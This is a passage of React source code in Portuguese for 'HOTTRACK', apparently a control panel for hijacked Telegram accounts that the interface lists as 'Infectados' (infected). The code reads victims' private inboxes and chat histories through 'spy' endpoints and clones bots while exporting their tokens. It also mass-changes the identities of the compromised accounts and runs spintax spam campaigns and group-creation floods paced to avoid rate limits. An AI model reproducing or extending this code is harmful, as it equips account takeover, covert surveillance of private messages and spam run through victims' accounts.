          await new Promise(r => setTimeout(r, 120000));
          continue;
        }

        // Busca leads não agrupados
        const res = await authenticatedFetch(`/api/get-unassigned-leads?limit=${LEADS_PER_BATCH}`);
        
        if (!res.ok) {
          const errorText = await res.text();
          addLog(`❌ Erro ao buscar leads: ${res.status} - ${errorText.substring(0, 100)}`);
          break;
        }
        
        const contentType = res.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
          const errorText = await res.text();
          addLog(`❌ Resposta inválida do servidor: ${errorText.substring(0, 100)}`);
          break;
        }
        
        let data;
        try {
          data = await res.json();
        } catch (jsonError) {
          addLog(`⛔ Erro ao processar resposta JSON: ${jsonError.message}`);
          break;
        }
        
        const leads = data.leads || [];

        if (leads.length === 0) {
          addLog('✅ Todos os leads já foram distribuídos em grupos.');
          break;
        }

        // Um grupo por lote: todos os leads do lote vão para um único grupo
        const creatorPhone = availableCreators.shift();
        const groupLeads = leads;
        const groupName = groupNameTemplate.replace('{number}', groupCounter.toString().padStart(3, '0'));

        try {
          const createRes = await authenticatedFetch('/api/create-group', {
            method: 'POST',
            body: JSON.stringify({
              creatorPhone: creatorPhone,
              leads: groupLeads,
              groupName: groupName,
              groupPhotoUrl: groupPhotoUrl
            })
          });

          if (!createRes.ok) {
            const errorText = await createRes.text();
            addLog(`❌ Erro ao criar grupo ${groupName}: ${createRes.status} - ${errorText.substring(0, 100)}`);
            availableCreators.push(creatorPhone);
            continue;
          }
          
          const resContentType = createRes.headers.get('content-type');
          if (!resContentType || !resContentType.includes('application/json')) {
            const errorText = await createRes.text();
            addLog(`❌ Resposta inválida ao criar grupo ${groupName}: ${errorText.substring(0, 100)}`);
            availableCreators.push(creatorPhone);
            continue;
          }
          
          let createData;
          try {
            createData = await createRes.json();
          } catch (jsonError) {
            addLog(`⛔ Erro ao processar resposta JSON do grupo ${groupName}: ${jsonError.message}`);
            availableCreators.push(creatorPhone);
            continue;
          }
          
          if (createData.success) {
            groupsCreated.push({
              id: createData.groupId,
              name: groupName,
              creatorPhone: creatorPhone,
              memberCount: groupLeads.length,
              createdAt: new Date().toISOString(),
              leads: groupLeads,
              photoUrl: groupPhotoUrl
            });
            
            totalLeadsAssigned += groupLeads.length;
            setGroupCreationProgress(stats.pending ? Math.round((totalLeadsAssigned / stats.pending) * 100) : 100);
            groupCounter++;
            
            addLog(`✅ Grupo criado: ${groupName} (${groupLeads.length} membros)`);
            
            setTimeout(() => {
              availableCreators.push(creatorPhone);
            }, 300000); // 5 minutos de cooldown
            
          } else {
            addLog(`❌ Falha ao criar grupo: ${createData.error}`);
            availableCreators.push(creatorPhone);
          }
        } catch (e) {
          addLog(`⛔ Erro na criação: ${e.message}`);
          availableCreators.push(creatorPhone);
        }

        // Pausa estratégica antes da próxima rodada (próximo lote)
        await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
      }

      setCreatedGroups(groupsCreated);
      addLog(`🏁 Criação concluída: ${groupsCreated.length} grupos com ${totalLeadsAssigned} membros totais.`);
      fetchData();

    } catch (e) {
      addLog(`⛔ Erro crítico na criação de grupos: ${e.message}`);
    }
    
    setIsCreatingGroups(false);
  };

  const broadcastToGroups = async () => {
    if (selectedGroupsForBroadcast.size === 0) return alert('Selecione grupos para o disparo!');
    if (!groupMessage.trim()) return alert('Digite uma mensagem para enviar!');
    
    if (!confirm(`⚡ INICIAR DISPARO NOS GRUPOS?\n\n• ${selectedGroupsForBroadcast.size} grupos selecionados\n• Mensagem: ${groupMessage.substring(0, 50)}...\n• Mídia: ${groupMediaUrl ? 'Sim' : 'Não'}`)) return;

    setIsBroadcasting(true);
    setBroadcastProgress(0);
    stopBroadcastRef.current = false;
    addLog('📢 Iniciando disparo segmentado nos grupos...');

    try {
      const targetGroups = createdGroups.filter(g => selectedGroupsForBroadcast.has(g.id));
      const DELAY_BETWEEN_GROUPS = 8000; // 8 segundos entre grupos
      let completedCount = 0;

      for (let i = 0; i < targetGroups.length; i++) {
        if (stopBroadcastRef.current) {
          addLog('🛑 Disparo em grupos interrompido.');
          break;
        }

        const group = targetGroups[i];
        
        try {
          const broadcastRes = await authenticatedFetch('/api/broadcast-group', {
            method: 'POST',
            body: JSON.stringify({
              groupId: group.id,
              creatorPhone: group.creatorPhone,
              message: groupMessage,
              mediaUrl: groupMediaUrl
            })
          });

          const broadcastData = await broadcastRes.json();
          
          if (broadcastData.success) {
            addLog(`✅ Disparo concluído em "${group.name}" - ${broadcastData.sentCount} mensagens enviadas`);
          } else {
            addLog(`❌ Falha no grupo "${group.name}": ${broadcastData.error}`);
          }

          completedCount++;
          setBroadcastProgress(Math.round((completedCount / targetGroups.length) * 100));

        } catch (e) {
          addLog(`⛔ Erro no grupo "${group.name}": ${e.message}`);
        }

        // Pausa entre grupos para evitar flood
        if (i < targetGroups.length - 1) {
          await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
        }
      }

      addLog('🏁 Disparo em grupos concluído com sucesso!');

    } catch (e) {
      addLog(`⛔ Erro crítico no disparo: ${e.message}`);
    }
    
    setIsBroadcasting(false);
  };

  const stopGroupOperations = () => {
    stopBroadcastRef.current = true;
    addLog('🛑 Interrompendo operações de grupo...');
  };

  const toggleGroupSelection = (groupId) => {
    const newSet = new Set(selectedGroupsForBroadcast);
    if (newSet.has(groupId)) {
      newSet.delete(groupId);
    } else {
      newSet.add(groupId);
    }
    setSelectedGroupsForBroadcast(newSet);
  };

  const selectAllGroups = () => {
    const allGroupIds = createdGroups.map(g => g.id);
    setSelectedGroupsForBroadcast(new Set(allGroupIds));
    addLog(`✅ Todos ${createdGroups.length} grupos selecionados para disparo.`);
  };

  // ==============================================================================
  // TOOLS: PERFIS E STORIES
  // ==============================================================================

  const handleMassUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione as contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`🎭 Atualizando identidade em ${phone}...`);
        await authenticatedFetch('/api/update-profile', { 
            method: 'POST', 
            body: JSON.stringify({ phone, newName, photoUrl })
        });
    }
    setProcessing(false); 
    addLog('✅ Identidades atualizadas.');
  };

  const handleMassPostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione as contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`📸 Postando Story em ${phone}...`);
          await authenticatedFetch('/api/post-story', { 
              method: 'POST', 
              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption })
          });
      }
      setProcessing(false); 
      addLog('✅ Stories postados.');
  };

  // Filtros de busca
  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;

  // --- RENDERIZAÇÃO (INTERFACE GRÁFICA) ---
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:'20px'}}>
          <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
              <button onClick={()=>setLoginMode('user')} style={{padding:'10px 20px', background: loginMode==='user'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Login Usuário</button>
              <button onClick={()=>setLoginMode('admin')} style={{padding:'10px 20px', background: loginMode==='admin'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Token Admin</button>
          </div>
          
          {loginMode === 'user' ? (
              <form onSubmit={handleUserLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>HOTTRACK ADMIN</h2>
                  <input type="text" value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} placeholder="Usuário" style={{padding:'15px', width:'250px', marginBottom:'10px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} autoFocus />
                  <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} />
                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#3390ec', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
              </form>
          ) : (
              <form onSubmit={handleAdminTokenLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #8957e5', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>TOKEN ADMINISTRATIVO</h2>
                  <input type="password" value={adminTokenInput} onChange={e=>setAdminTokenInput(e.target.value)} placeholder="Senha Administrativa" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white'}} autoFocus />
                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
              </form>
          )}
      </div>
  );

  // ==============================================================================
  // INBOX VIEWER - FUNCIONALIDADES OTIMIZADAS
  // ==============================================================================
  
  const loadInbox = async (phone) => {
    if (!phone) return;
    
    setLoadingInbox(true);
    setSelectedInboxPhone(phone);
    setSelectedDialog(null);
    setInboxHistory([]);
    
    try {
      const res = await authenticatedFetch('/api/spy/get-inbox', {
        method: 'POST',
        body: JSON.stringify({ phone })
      });
      
      const data = await res.json();
      
      if (data.success && data.dialogs) {
        setInboxDialogs(data.dialogs);
        addLog(`📬 Carregados ${data.dialogs.length} diálogos para ${phone}`);
        
        // Auto-seleciona o primeiro diálogo se houver
        if (data.dialogs.length > 0) {
          // Prioriza diálogos com mensagens não lidas
          const firstUnread = data.dialogs.find(d => d.unreadCount > 0);
          const firstDialog = firstUnread || data.dialogs[0];
          setSelectedDialog(firstDialog);
          loadInboxHistory(firstDialog.id);
        }
      } else {
        addLog(`❌ Erro ao carregar inbox: ${data.error || 'Erro desconhecido'}`);
        setInboxDialogs([]);
      }
    } catch (e) {
      console.error('Erro loadInbox:', e);
      addLog(`⛔ Erro ao carregar inbox: ${e.message}`);
      setInboxDialogs([]);
    } finally {
      setLoadingInbox(false);
    }
  };

  const cloneBot = async () => {
    if (!selectedInboxPhone || !selectedDialog) {
      addLog('❌ Selecione um bot para clonar');
      return;
    }
    
    if (selectedDialog.type !== 'Bot') {
      addLog('❌ Esta função só funciona com bots');
      return;
    }
    
    // Pede informações do novo bot
    const newBotName = prompt('Nome do novo bot:', `Clone_${selectedDialog.title}`);
    const newBotUsername = prompt('Username do novo bot (sem @):', `${selectedDialog.username || 'bot'}_clone`);
    
    if (!newBotName || !newBotUsername) {
      addLog('❌ Nome e username são obrigatórios');
      return;
    }
    
    setLoadingBotFlow(true);
    addLog(`🤖 Clonando bot "${selectedDialog.title}"...`);
    
    try {
      const res = await authenticatedFetch('/api/spy/clone-bot', {
        method: 'POST',
        body: JSON.stringify({ 
          phone: selectedInboxPhone, 
          botId: selectedDialog.id,
          newBotName: newBotName,
          newBotUsername: newBotUsername
        })
      });
      
      const data = await res.json();
      
      if (data.success) {
        addLog(`✅ Bot clonado com sucesso!`);
        addLog(`📊 Estatísticas:`);
        addLog(`   • Mensagens: ${data.summary.stats.messages}`);
        addLog(`   • Mídias: ${data.summary.stats.mediaFiles}`);
        addLog(`   • Links: ${data.summary.stats.links}`);
        addLog(`   • Botões: ${data.summary.stats.buttons}`);
        addLog(`🔑 Token: ${data.botToken}`);
        addLog(`🆔 ID: ${data.clonedBot.id}`);
        
        // Mostra informações do novo bot
        console.log('🤖 Bot clonado:', data);
        
        // Cria um arquivo com todos os dados do bot
        const botData = {
          token: data.botToken,
          name: data.summary.newBot.name,
          username: data.summary.newBot.username,
          originalBot: data.summary.originalBot,
          stats: data.summary.stats,
          fullData: data.clonedBot.bot_data,
          clonedAt: data.clonedBot.cloned_at
        };
        
        const blob = new Blob([JSON.stringify(botData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `cloned-bot-${newBotUsername}-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        addLog(`💾 Dados completos salvos como arquivo JSON`);
        
      } else {
        addLog(`❌ Erro ao clonar bot: ${data.error}`);
      }
    } catch (e) {
      console.error('❌ Erro cloneBot:', e);
      addLog(`⛔ Erro ao clonar bot: ${e.message}`);
    } finally {
      setLoadingBotFlow(false);
    }
  };

  const loadInboxHistory = async (dialogId) => {
    if (!selectedInboxPhone || !dialogId) {
      console.error('❌ loadInboxHistory: missing selectedInboxPhone or dialogId');
      return;
    }
    
    console.log(`🔍 DEBUG loadInboxHistory: phone=${selectedInboxPhone}, dialogId=${dialogId}`);
    
    setLoadingInboxHistory(true);
    
    try {
      // Verifica se é um bot baseado no diálogo selecionado
      const isBot = selectedDialog?.type === 'Bot' || selectedDialog?.title?.includes('🤖');
      const apiUrl = isBot ? '/api/spy/get-history-bots' : '/api/spy/get-history';
      
      console.log(`🤖 Usando API ${isBot ? 'get-history-bots' : 'get-history'} para ${isBot ? 'bot' : 'chat normal'}`);
      
      const res = await authenticatedFetch(apiUrl, {
        method: 'POST',
        body: JSON.stringify({ 
          phone: selectedInboxPhone, 
          chatId: dialogId,
          limit: 100 // Aumentado para mostrar histórico completo
        })
      });
      
      console.log(`📡 Response status: ${res.status}`);
      
      const data = await res.json();
      console.log('📨 Response data:', data);
      
      if (data.success && data.history) {
        setInboxHistory(data.history);
        addLog(`📝 Carregadas ${data.history.length} mensagens do diálogo ${isBot ? '(bot)' : '(chat normal)'}`);
        if (data.methodUsed) {
          addLog(`🔧 Método usado: ${data.methodUsed}`);
        }
        console.log(`✅ Sucesso: ${data.history.length} mensagens carregadas`);
      } else {
        const errorMsg = data.error || 'Erro desconhecido';
        addLog(`❌ Erro ao carregar histórico: ${errorMsg}`);
        setInboxHistory([]);
        console.error('❌ Erro na resposta:', data);
      }
    } catch (e) {
      console.error('❌ Erro loadInboxHistory:', e);
      addLog(`⛔ Erro ao carregar histórico: ${e.message}`);
      setInboxHistory([]);
    } finally {
      setLoadingInboxHistory(false);
    }
  };

  const selectDialog = (dialog) => {
    console.log(`🔍 DEBUG selectDialog: dialog=${JSON.stringify(dialog)}`);
    
    if (selectedDialog?.id === dialog.id) {
      console.log('⚠️ Dialog já selecionado, ignorando');
      return; // Não recarrega se já selecionado
    }
    
    console.log(`📝 Selecionando diálogo: ${dialog.title} (ID: ${dialog.id})`);
    setSelectedDialog(dialog);
    loadInboxHistory(dialog.id);
  };

  const refreshInbox = async () => {
    if (selectedInboxPhone) {
      await loadInbox(selectedInboxPhone);
    }
  };

  const refreshHistory = async () => {
    if (selectedDialog) {
      await loadInboxHistory(selectedDialog.id);
    }
  };

  // Formata melhor o tamanho de arquivo
  const formatFileSize = (bytes) => {
    if (!bytes) return '';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  };

  // Formata melhor a data
  const formatMessageTime = (date) => {
    const now = new Date();
    const msgDate = new Date(date);
    const diffMs = now - msgDate;
    const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
    const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
    
    if (diffHours < 1) {
      return msgDate.toLocaleTimeString('pt-BR', {
        hour: '2-digit',
        minute: '2-digit'
      });
    } else if (diffHours < 24) {
      return msgDate.toLocaleTimeString('pt-BR', {
        hour: '2-digit',
        minute: '2-digit'
      });
    } else if (diffDays < 7) {
      return msgDate.toLocaleDateString('pt-BR', {
        weekday: 'short',
        hour: '2-digit',
        minute: '2-digit'
      });
    } else {
      return msgDate.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit'
      });
    }
  };

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
        
        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'700px', height:'85%', background:'#161b22', border:'1px solid #30363d', borderRadius:'12px', display:'flex', flexDirection:'column', overflow:'hidden'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background:'#21262d'}}>
                        <div>
                            <h3 style={{margin:0, color:'white'}}>{viewingChat.title}</h3>
                            <small style={{color:'#8b949e'}}>Monitorado via: {viewingChat.ownerPhone}</small>
                        </div>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'#ff5c5c', fontSize:'24px', cursor:'pointer'}}>✖</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'20px', display:'flex', flexDirection:'column', gap:'15px'}}>
                        {loadingHistory ? <p style={{textAlign:'center', color:'#3390ec'}}>Carregando histórico...</p> : 
                            chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Sem mensagens recentes.</p> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'12px', borderRadius:'10px', maxWidth:'85%', border:'1px solid rgba(255,255,255,0.05)'}}>
                                    <div style={{fontSize:'11px', fontWeight:'bold', marginBottom:'5px', color: m.isOut ? '#afffb0' : '#3390ec'}}>{m.sender}</div>
                                    {m.media && (
                                        <div style={{marginBottom:'10px'}}>
                                            <img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'8px'}} />
                                        </div>
                                    )}
                                    <div style={{color:'white', whiteSpace:'pre-wrap', fontSize:'14px'}}>{m.text}</div>
                                </div>
                            ))
                        }
                    </div>
                </div>
            </div>
        )}

        {/* MENU SUPERIOR */}
        <div style={{marginBottom:'25px', display:'flex', gap:'10px', borderBottom:'1px solid #30363d', paddingBottom:'15px', alignItems:'center'}}>
            <h2 style={{margin:0, marginRight:'20px', color:'white', fontFamily:'monospace'}}>HOTTRACK</h2>
            <button onClick={()=>setTab('dashboard')} style={{padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', color:'white', border:'1px solid #238636', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🚀 CRM TURBO</button>
            <button onClick={()=>setTab('groups')} style={{padding:'10px 20px', background: tab==='groups'?'#d29922':'transparent', color:'white', border:'1px solid #d29922', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👥 GRUPOS</button>
            <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
            <button onClick={()=>setTab('inbox')} style={{padding:'10px 20px', background: tab==='inbox'?'#e34234':'transparent', color:'white', border:'1px solid #e34234', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>📬 INBOX</button>
            <button onClick={() => setTab('channels')} style={{padding:'10px 20px', background: tab==='channels'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>📺 CANAIS</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e', display:'flex', alignItems:'center', gap:'15px'}}>
                {isAdmin && <span style={{color:'#8957e5', fontWeight:'bold'}}>🔑 ADMIN</span>}
                <span>v6.0 (Estratégia Híbrida)</span>
                <button onClick={handleLogout} style={{padding:'8px 15px', background:'#f85149', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontSize:'12px', fontWeight:'bold'}}>Sair</button>
            </div>
        </div>

        {/* --- ABA DASHBOARD (DISPARO) --- */}
        {tab === 'dashboard' && (
             <div style={{display:'grid', gridTemplateColumns:'1.5fr 1fr', gap:'25px'}}>
                
                {/* PAINEL ESQUERDO: CONFIGURAÇÃO */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                    <div style={{display:'flex', gap:'20px', marginBottom:'25px'}}>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #d29922', padding:'20px', textAlign:'center', borderRadius:'10px'}}>
                            <h2 style={{margin:0, color:'#d29922', fontSize:'32px'}}>{stats.pending?.toLocaleString()}</h2>
                            <small style={{textTransform:'uppercase', letterSpacing:'1px', opacity:0.7}}>Leads Pendentes</small>
                        </div>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #238636', padding:'20px', textAlign:'center', borderRadius:'10px'}}>
                            <h2 style={{margin:0, color:'#238636', fontSize:'32px'}}>{stats.sent?.toLocaleString()}</h2>
                            <small style={{textTransform:'uppercase', letterSpacing:'1px', opacity:0.7}}>Total Enviado</small>
                        </div>
                    </div>
                    
                    <h3 style={{marginTop:0, marginBottom:'15px', color:'#3390ec'}}>Configurar Campanha Massiva</h3>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Imagem do Anúncio (URL):</label>
                    <input type="text" placeholder="https://i.imgur.com/exemplo.jpg" value={imgUrl} onChange={e=>setImgUrl(e.target.value)} style={{width:'100%', padding:'14px', marginBottom:'20px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mensagem (Spintax ativo):</label>
                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Olá {amigo|parceiro}, tudo bem?" style={{width:'100%', height:'120px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'14px', borderRadius:'8px', fontSize:'15px', lineHeight:'1.5', resize:'none'}}/>
                    
                    <div style={{display:'flex', gap:'15px', marginTop:'20px'}}>
                        {!processing ? (
                            <button onClick={startRealCampaign} style={{flex:1, padding:'20px', background:'#238636', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', transition:'0.3s', boxShadow:'0 4px 15px rgba(35, 134, 54, 0.3)'}}>
                                🔥 INICIAR ATAQUE TURBO
                            </button>
                        ) : (
                            <button onClick={stopCampaign} style={{flex:1, padding:'20px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
                                🛑 PARAR DISPARO IMEDIATAMENTE
                            </button>
                        )}
                    </div>
                    
                    <div style={{marginTop:'25px'}}>
                        <div style={{display:'flex', justifyContent:'space-between', marginBottom:'10px'}}>
                            <span style={{fontSize:'12px', fontWeight:'bold'}}>LOGS DO SISTEMA {processing ? `(${progress}%)` : ''}</span>
                            <button onClick={()=>setLogs([])} style={{background:'none', border:'none', color:'#8b949e', cursor:'pointer', fontSize:'11px'}}>Limpar Logs</button>
                        </div>
                        <div style={{height:'200px', overflowY:'auto', background:'#000', padding:'15px', fontSize:'12px', borderRadius:'8px', border:'1px solid #30363d', color:'#00ff00', fontFamily:'"Courier New", Courier, monospace'}}>
                            {logs.map((l,i)=><div key={i} style={{marginBottom:'4px'}}>{l}</div>)}
                        </div>
                    </div>
                </div>

                {/* PAINEL DIREITO: INFECTADOS */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d', display:'flex', flexDirection:'column'}}>
                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px'}}>
                        <h3 style={{margin:0}}>Infectados ({sessions.length})</h3>
                        <button onClick={checkAllStatus} disabled={checkingStatus} style={{fontSize:'12px', padding:'8px 15px', background:'#1f6feb', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>
                            {checkingStatus ? '🔄 CHECANDO...' : '⚡ CHECK STATUS'}
                        </button>
                    </div>

                    <div style={{display:'flex', gap:'15px', marginBottom:'20px', padding:'10px', background:'#0d1117', borderRadius:'8px', border:'1px solid #21262d'}}>
                        <div style={{flex:1, textAlign:'center'}}><div style={{color:'#238636', fontSize:'18px', fontWeight:'bold'}}>{sessions.filter(s=>s.is_active).length}</div><small>ONLINE</small></div>
                        <div style={{width:'1px', background:'#30363d'}}></div>
                        <div style={{flex:1, textAlign:'center'}}><div style={{color:'#f85149', fontSize:'18px', fontWeight:'bold'}}>{sessions.filter(s=>!s.is_active).length}</div><small>OFFLINE</small></div>
                    </div>
                    
                    <button onClick={selectAllActive} style={{width:'100%', padding:'12px', background:'#30363d', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', marginBottom:'15px', fontWeight:'bold', fontSize:'13px'}}>SELECIONAR TODOS ONLINE</button>
                    
                    <div style={{flex:1, maxHeight:'600px', overflowY:'auto', paddingRight:'5px'}}>
                        {sessions.map(s => (
                            <div key={s.id} style={{padding:'12px', marginBottom:'8px', borderRadius:'8px', border:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background: selectedPhones.has(s.phone_number) ? 'rgba(51, 144, 236, 0.1)' : '#0d1117'}}>
                                <div style={{display:'flex', alignItems:'center', gap:'12px'}}>
                                    <div style={{width:'10px', height:'10px', borderRadius:'50%', background: s.is_active ? '#238636' : '#f85149', boxShadow: s.is_active ? '0 0 10px #238636' : 'none'}}></div>
                                    <div>
                                        <div style={{fontSize:'14px', fontWeight:'bold', color: s.is_active ? 'white' : '#8b949e'}}>{s.phone_number}</div>
                                        <div style={{fontSize:'10px', opacity:0.5}}>{new Date(s.created_at).toLocaleDateString()}</div>
                                    </div>
                                </div>
                                <div style={{display:'flex', gap:'8px'}}>
                                    <input type="checkbox" checked={selectedPhones.has(s.phone_number)} onChange={()=>toggleSelect(s.phone_number)} style={{width:'20px', height:'20px', cursor:'pointer'}} />
                                    <button 
                                        onClick={() => {
                                            setTab('inbox');
                                            loadInbox(s.phone_number);
                                        }} 
                                        disabled={!s.is_active}
                                        title={s.is_active ? 'Visualizar Inbox' : 'Número offline'}
                                        style={{
                                            background: s.is_active ? '#e34234' : '#30363d', 
                                            border:'none', 
                                            color:'white', 
                                            cursor: s.is_active ? 'pointer' : 'not-allowed', 
                                            fontSize:'12px', 
                                            padding:'6px 10px',
                                            borderRadius:'4px',
                                            opacity: s.is_active ? 1 : 0.5
                                        }}
                                    >
                                        📬
                                    </button>
                                    <button onClick={()=>handleDeleteSession(s.phone_number)} style={{background:'none', border:'none', color:'#f85149', cursor:'pointer', fontSize:'16px'}}>🗑️</button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                {isAdmin && (
                    <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                        <h3 style={{marginTop:0, color:'#8957e5'}}>Admin: Usuários</h3>
                        <div style={{maxHeight:'280px', overflowY:'auto', border:'1px solid #30363d', borderRadius:'8px', background:'#0d1117'}}>
                            {(usersList || []).map(u => (
                                <div key={u.id} style={{padding:'12px', borderBottom:'1px solid #30363d'}}>
                                    <div style={{display:'flex', justifyContent:'space-between', gap:'10px'}}>
                                        <div style={{fontWeight:'bold', color:'white'}}>{u.username}</div>
                                        <div style={{fontSize:'11px', color:'#8b949e'}}>{new Date(u.created_at).toLocaleDateString()}</div>
                                    </div>
                                    <div style={{fontFamily:'monospace', fontSize:'12px', color:'#58a6ff', wordBreak:'break-all'}}>{`/?t=${u.public_token}`}</div>
                                    <div style={{fontSize:'12px', color:'#8b949e', wordBreak:'break-all'}}>{u.redirect_url || '—'}</div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}
             </div>
        )}

        {/* --- ABA GRUPOS (CRIAÇÃO E DISPAROS) --- */}
        {tab === 'groups' && (
            <div style={{display:'grid', gridTemplateColumns:'1.2fr 1fr', gap:'25px'}}>
                
                {/* PAINEL ESQUERDO: CRIAÇÃO DE GRUPOS */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
                        <h3 style={{margin:0, color:'#d29922'}}>🎯 Criação Inteligente de Grupos</h3>
                        <div style={{fontSize:'12px', color:'#8b949e'}}>
                            {createdGroups.length} grupos criados
                        </div>
                    </div>
                    
                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'10px', marginBottom:'25px', border:'1px solid #3390ec'}}>
                        <h4 style={{color:'#3390ec', margin:'0 0 15px 0'}}>🎨 Personalização dos Grupos</h4>
                        
                        <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold', color:'#c9d1d9'}}>Nome do Grupo (use {'{number}'} para numeração):</label>
                        <input 
                            type="text" 
                            placeholder="VIP Club {number}" 
                            value={groupNameTemplate} 
                            onChange={e=>setGroupNameTemplate(e.target.value)} 
                            style={{width:'100%', padding:'12px', marginBottom:'15px', background:'#000', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}} 
                        />
                        <div style={{fontSize:'11px', color:'#8b949e', marginBottom:'15px'}}>
